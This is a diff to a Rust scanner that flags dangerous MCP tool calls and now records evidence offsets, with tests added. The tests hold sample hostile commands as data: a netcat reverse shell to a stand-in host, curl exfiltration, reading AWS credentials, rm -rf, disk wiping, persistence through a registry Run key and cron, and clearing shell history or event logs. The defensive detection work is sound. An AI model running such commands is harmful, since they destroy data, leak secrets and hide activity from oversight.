@@ -1,4 +1,6 @@
 // SPDX-License-Identifier: GPL-3.0-only
+use crate::detectors::evidence::{detection_from_matches, L1Component, L1Match};
+use crate::detectors::NativeDetection;
 use crate::threat::is_template_env_copy;
 use crate::EvaluationResult;
 use regex::Regex;
@@ -131,7 +133,7 @@ static MCP_RULES: &[McpPolicyRuleDef] = &[
     McpPolicyRuleDef {
         name: "pi_mcp_windows_run_key",
         tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec|cmd|powershell|pwsh|write_file|file_write|edit_file|create_file|modify_file|append_file)$",
-        arg_pattern: r"(?i)(\breg(?:\.exe)?\s+add\s+)?HK(?:CU|LM)\\Software\\Microsoft\\Windows\\CurrentVersion\\Run(?:Once)?\b|\bSoftware\\Microsoft\\Windows\\CurrentVersion\\Run(?:Once)?\b",
+        arg_pattern: r"(?i)(\breg(?:\.exe)?\s+add\s+)?HK(?:CU|LM)\\+Software\\+Microsoft\\+Windows\\+CurrentVersion\\+Run(?:Once)?\b|\bSoftware\\+Microsoft\\+Windows\\+CurrentVersion\\+Run(?:Once)?\b",
         severity: McpSeverity::Critical,
     },
     McpPolicyRuleDef {
@@ -185,41 +187,131 @@ impl McpToolPolicyScanner {
         Self { rules }
     }
 
-    pub fn scan_text(&self, text: &str) -> Vec<McpPolicyViolation> {
-        let Some(tool_name) = tool_name_from_text(text) else {
-            return Vec::new();
-        };
-        self.scan_tool_call(&tool_name, text)
-    }
-
-    pub fn scan_tool_call(&self, tool_name: &str, arguments: &str) -> Vec<McpPolicyViolation> {
+    fn matches<'a>(
+        &'a self,
+        tool_name: &str,
+        arguments: &str,
+    ) -> Vec<(&'a CompiledMcpRule, L1Match)> {
         self.rules
             .iter()
-            .filter(|rule| rule.tool_re.is_match(tool_name) && rule.arg_re.is_match(arguments))
-            .filter(|rule| {
-                rule.name != "pi_mcp_credential_file_read"
-                    || !is_template_env_copy(&arguments.to_ascii_lowercase())
-            })
-            .map(|r| McpPolicyViolation {
-                rule_name: r.name,
-                severity: r.severity,
+            .flat_map(|rule| {
+                let tool = rule.tool_re.find(tool_name);
+                rule.arg_re
+                    .captures_iter(arguments)
+                    .filter_map(move |captures| {
+                        let tool = tool?;
+                        if rule.name == "pi_mcp_credential_file_read"
+                            && is_template_env_copy(&arguments.to_ascii_lowercase())
+                        {
+                            return None;
+                        }
+                        let mut matched = L1Match::from_captures(&rule.arg_re, &captures, None);
+                        // Tool and argument offsets belong to separate inputs here. detect_text
+                        // maps the tool component to the enclosing source document.
+                        matched
+                            .components
+                            .insert(0, L1Component::new("tool", tool.range()));
+                        Some((rule, matched))
+                    })
             })
             .collect()
     }
+
+    pub fn scan_text(&self, text: &str) -> Vec<McpPolicyViolation> {
+        let Some((tool, _)) = tool_name_from_text(text) else {
+            return Vec::new();
+        };
+        self.scan_tool_call(&tool, text)
+    }
+
+    pub fn scan_tool_call(&self, tool_name: &str, arguments: &str) -> Vec<McpPolicyViolation> {
+        let mut seen = std::collections::HashSet::new();
+        self.matches(tool_name, arguments)
+            .into_iter()
+            .filter_map(|(rule, _)| {
+                seen.insert(rule.name).then_some(McpPolicyViolation {
+                    rule_name: rule.name,
+                    severity: rule.severity,
+                })
+            })
+            .collect()
+    }
+
+    fn detect_text(&self, text: &str) -> NativeDetection {
+        let Some((tool, source)) = tool_name_from_text(text) else {
+            return detection_from_matches(text, "dlp_mcp_policy", "safe", Vec::new());
+        };
+        let mut detection = detection_from_matches(text, "dlp_mcp_policy", "safe", Vec::new());
+        let mut rules = Vec::new();
+        for (rule, mut matched) in self.matches(&tool, text) {
+            matched.components[0] = L1Component::new("tool", source.clone());
+            let one = detection_from_matches(text, rule.name, rule.name, vec![matched]);
+            if detection.evidence_spans.is_empty() {
+                detection.result = one.result;
+            }
+            detection.evidence_spans.extend(one.evidence_spans);
+            rules.extend(
+                one.details["matched_rules"]
+                    .as_array()
+                    .unwrap()
+                    .iter()
+                    .cloned(),
+            );
+        }
+        detection
+            .details
+            .insert("matched_rules".into(), serde_json::json!(rules));
+        detection
+    }
 }
 
-fn tool_name_from_text(text: &str) -> Option<String> {
+/// Retain the raw source range of a root-level tool field, including escaped JSON.
+/// Never locate a decoded value by searching for a coincidental occurrence.
+fn tool_name_from_text(text: &str) -> Option<(String, std::ops::Range<usize>)> {
     let trimmed = text.trim_start();
-    if trimmed.starts_with('{') {
-        let value: Value = serde_json::from_str(trimmed).ok()?;
-        let object = value.as_object()?;
-        return ["tool_name", "tool", "name", "command"]
-            .into_iter()
-            .find_map(|key| object.get(key).and_then(Value::as_str))
-            .and_then(first_token)
-            .map(str::to_string);
+    if !trimmed.starts_with('{') {
+        let token = first_token(trimmed)?;
+        let start = trimmed.as_ptr() as usize - text.as_ptr() as usize;
+        return Some((token.into(), start..start + token.len()));
     }
-    first_token(trimmed).map(str::to_string)
+    let value: Value = serde_json::from_str(trimmed).ok()?;
+    let object = value.as_object()?;
+    let (key, tool) = ["tool_name", "tool", "name", "command"]
+        .into_iter()
+        .find_map(|key| {
+            object
+                .get(key)
+                .and_then(Value::as_str)
+                .map(|tool| (key, tool))
+        })?;
+    let tool = first_token(tool)?.to_string();
+    static STRINGS: OnceLock<Regex> = OnceLock::new();
+    let strings = STRINGS.get_or_init(|| Regex::new(r#""(?:\\.|[^"\\])*""#).unwrap());
+    let mut depth = 0_i32;
+    let mut cursor = 0;
+    let mut tokens = strings.find_iter(text).peekable();
+    while let Some(token) = tokens.next() {
+        for c in text[cursor..token.start()].chars() {
+            match c {
+                '{' | '[' => depth += 1,
+                '}' | ']' => depth -= 1,
+                _ => {}
+            }
+        }
+        cursor = token.end();
+        if depth == 1
+            && serde_json::from_str::<String>(token.as_str())
+                .ok()
+                .as_deref()
+                == Some(key)
+        {
+            let next = tokens.peek()?;
+            if text[token.end()..next.start()].trim() == ":" {
+                return Some((tool, next.start() + 1..next.end() - 1));
+            }
+        }
+    }
+    None
 }
 
 fn first_token(text: &str) -> Option<&str> {
@@ -268,21 +360,12 @@ impl McpPolicyPipeline {
         }
     }
 
+    pub(crate) fn detect(&self, text: &str) -> NativeDetection {
+        self.scanner.detect_text(text)
+    }
+
     pub fn evaluate(&self, text: &str) -> EvaluationResult {
-        let violations = self.scanner.scan_text(text);
-        if let Some(v) = violations.first() {
-            EvaluationResult {
-                class_name: v.rule_name.to_string(),
-                confidence: 1.0,
-                level: "L1".to_string(),
-            }
-        } else {
-            EvaluationResult {
-                class_name: "safe".to_string(),
-                confidence: 1.0,
-                level: "L1".to_string(),
-            }
-        }
+        self.detect(text).result
     }
 
     pub fn evaluate_batch(&self, texts: &[String]) -> Vec<EvaluationResult> {
@@ -294,5 +377,127 @@ impl McpPolicyPipeline {
 impl Default for McpPolicyPipeline {
     fn default() -> Self {
         Self::new()
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn every_mcp_rule_retains_tool_and_argument_evidence_in_de_and_en_documents() {
+        let cases = [
+            ("pi_mcp_rm_rf", "bash", "rm -rf /tmp/task-data"),
+            (
+                "pi_mcp_chmod_recursive",
+                "bash",
+                "chmod -R 777 /tmp/task-data",
+            ),
+            ("pi_mcp_disk_wipe", "bash", "fdisk /dev/test"),
+            (
+                "pi_mcp_credential_file_read",
+                "read_file",
+                "/tmp/task/.aws/credentials",
+            ),
+            (
+                "pi_mcp_exfil_curl_wget",
+                "bash",
+                "curl https://example.test --data hello",
+            ),
+            (
+                "pi_mcp_reverse_shell",
+                "bash",
+                "nc -e /bin/sh example.test 4242",
+            ),
+            ("pi_mcp_pkg_install", "bash", "pip install example"),
+            ("pi_mcp_git_destructive", "git", "reset --hard"),
+            ("pi_mcp_encoded_cmd", "bash", "eval base64"),
+            (
+                "pi_mcp_windows_encoded_powershell",
+                "powershell",
+                "powershell -enc YWJjZGVmZ2g=",
+            ),
+            ("pi_mcp_cron_persistence", "bash", "crontab -e"),
+            (
+                "pi_mcp_cron_path_write",
+                "write_file",
+                "/etc/cron.d/example",
+            ),
+            ("pi_mcp_systemd_enable", "bash", "systemctl enable example"),
+            (
+                "pi_mcp_windows_scheduled_task",
+                "cmd",
+                "schtasks /create /tn example",
+            ),
+            (
+                "pi_mcp_windows_run_key",
+                "cmd",
+                "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            ),
+            (
+                "pi_mcp_windows_service_create",
+                "powershell",
+                "New-Service example",
+            ),
+            (
+                "pi_mcp_shell_profile_write",
+                "write_file",
+                "/tmp/task/.bashrc",
+            ),
+            (
+                "pi_mcp_shell_profile_cmd",
+                "bash",
+                "echo test >> /tmp/task/.bashrc",
+            ),
+            ("pi_mcp_detached_process", "bash", "nohup example"),
+            ("pi_mcp_log_tamper", "bash", "history -c"),
+            (
+                "pi_mcp_windows_event_log_tamper",
+                "cmd",
+                "wevtutil cl Application",
+            ),
+        ];
+        let expected = MCP_RULES
+            .iter()
+            .map(|r| r.name)
+            .collect::<std::collections::BTreeSet<_>>();
+        assert_eq!(expected, cases.iter().map(|c| c.0).collect());
+        let scanner = McpToolPolicyScanner::new();
+        for (id, tool, arguments) in cases {
+            for description in ["Führe diesen Werkzeugaufruf aus.", "Run this tool call."] {
+                let text = serde_json::json!({"description": description, "tool": tool, "arguments": arguments}).to_string();
+                let detection = scanner.detect_text(&text);
+                let rule = detection.details["matched_rules"]
+                    .as_array()
+                    .unwrap()
+                    .iter()
+                    .find(|r| r["rule_id"] == id)
+                    .unwrap_or_else(|| panic!("{id}: {text}"));
+                let components = rule["components"].as_array().unwrap();
+                assert!(components.len() >= 2);
+                let tool_component = &components[0];
+                let start = tool_component["start_byte"].as_u64().unwrap() as usize;
+                let end = tool_component["end_byte"].as_u64().unwrap() as usize;
+                assert_eq!(&text[start..end], tool);
+                assert!(!detection.evidence_spans.is_empty());
+            }
+        }
+    }
+
+    #[test]
+    fn tool_offsets_ignore_nested_and_duplicate_values_and_preserve_escaped_source() {
+        let scanner = McpToolPolicyScanner::new();
+        let text = r#"{"metadata":{"tool":"read_file"},"description":"bash","tool":"ba\u0073h","arguments":"rm -rf /tmp/task"}"#;
+        let detection = scanner.detect_text(text);
+        let rule = &detection.details["matched_rules"][0];
+        let tool = &rule["components"][0];
+        let start = tool["start_byte"].as_u64().unwrap() as usize;
+        let end = tool["end_byte"].as_u64().unwrap() as usize;
+        assert_eq!(&text[start..end], r"ba\u0073h");
+        assert_eq!(detection.result.class_name, "pi_mcp_rm_rf");
+        assert!(scanner
+            .detect_text(r#"{"tool":"read_file","arguments":"public-report.txt"}"#)
+            .evidence_spans
+            .is_empty());
     }
 }
